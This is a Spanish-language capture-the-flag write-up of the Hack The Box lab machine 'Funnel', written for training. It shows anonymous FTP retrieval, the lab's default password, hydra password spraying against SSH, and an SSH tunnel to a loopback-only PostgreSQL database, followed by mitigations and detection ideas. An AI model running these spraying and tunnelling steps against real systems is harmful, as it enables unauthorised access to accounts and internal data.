---
machine: Funnel
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [ftp, ssh, tunnelling, postgresql, tier1]
---

# Funnel — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

**FTP anónimo (21/tcp)** publica documentación interna que revela la contraseña por defecto de los usuarios. Con *password spraying* sobre **SSH (22/tcp)** se entra como `christine`, y desde dentro se descubre **PostgreSQL en 5432 escuchando en loopback**. Un túnel SSH lo expone y la base `secrets` contiene la flag.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
```

- Dos puertos visibles; el 5432 **no** está expuesto al exterior.
- `ftp-anon` habilitado.

## Enumeración

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: <Enter>
ftp> ls -la
ftp> get <documento_de_politica>
```

El documento describe la política de contraseñas y deja entrever el patrón por defecto de las cuentas (`funnel123#!#`). Sin usuarios válidos a la vista, se enumeran los habituales:

```bash
printf 'admin\nchristine\nbob\nroot\n' > users.txt
hydra -L users.txt -p '<PASSWORD_PATTERN>' ssh://<TARGET_IP>
```

```text
[22][ssh] host: <TARGET_IP>   login: christine   password: <PASSWORD>
```

En el host:

```bash
ssh christine@<TARGET_IP>
ss -tlnp
```

```text
LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*
```

## Foothold

PostgreSQL solo escucha en loopback, así que se trae al equipo atacante con un túnel:

```bash
ssh -L 5432:127.0.0.1:5432 christine@<TARGET_IP>
```

En otra terminal:

```bash
psql -h 127.0.0.1 -p 5432 -U christine -d secrets
```

```sql
\dt
SELECT * FROM <tabla_con_flag>;
```

La flag está en la base `secrets`, accesible con las credenciales por defecto del propio usuario del sistema.

## Movimiento lateral

- El túnel SSH es el movimiento: convierte un servicio interno en local.
- Se comprueban también `127.0.0.1:8080` y otros puertos del `ss` por si hubiera más servicios.
- La contraseña de `christine` se reutiliza en `psql`.

## Escalada de privilegios

- No aplica: la flag está en la base de datos, no en `/root`.
- Si se necesitara root, el siguiente paso sería revisar `sudo -l` y binarios SUID (fuera del alcance de esta caja).

## Evidencia

- Listado FTP anónimo con el documento (contenido redactado).
- `ss -tlnp` mostrando 5432 en loopback.
- Consulta SQL con la flag redactada.

## Lecciones aprendidas

- Un servicio que solo escucha en `127.0.0.1` no está fuera de alcance: el túnel SSH lo alcanza.
- El FTP anónimo sirve para algo más que descargar flags: la documentación filtra políticas y patrones.
- El *password spraying* con una sola contraseña prueba muchas cuentas sin bloquearlas.
- `ssh -L local:destino:puerto` es la herramienta base del pivoting.

## Mitigaciones y detección

**Cómo se corrige:**

- Deshabilitar FTP anónimo y no publicar documentación interna.
- Contraseñas únicas y fuertes; prohibir patrones por defecto.
- Limitar intentos SSH (`MaxAuthTries`, `fail2ban`) y usar claves.
- PostgreSQL con `scram-sha-256`, `pg_hba.conf` restrictivo y usuario con permisos mínimos.

**Cómo se detectaría:**

- Descargas desde FTP anónimo seguidas de intentos SSH (correlación temporal).
- Muchos fallos de autenticación desde una IP y un éxito posterior.
- Conexiones a 5432 desde procesos no habituales o reenvíos SSH (`-L`).

- CWE-521: Weak Password Requirements
- CWE-668: Exposure of Resource to Wrong Sphere
- MITRE ATT&CK: [T1021.004 SSH](https://attack.mitre.org/techniques/T1021/004/), [T1572 Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)

## Referencias

- [SSH — port forwarding](https://www.ssh.com/academy/ssh/tunneling/example)
- [PostgreSQL — pg_hba.conf](https://www.postgresql.org/docs/current/auth-pg-hba-conf.html)
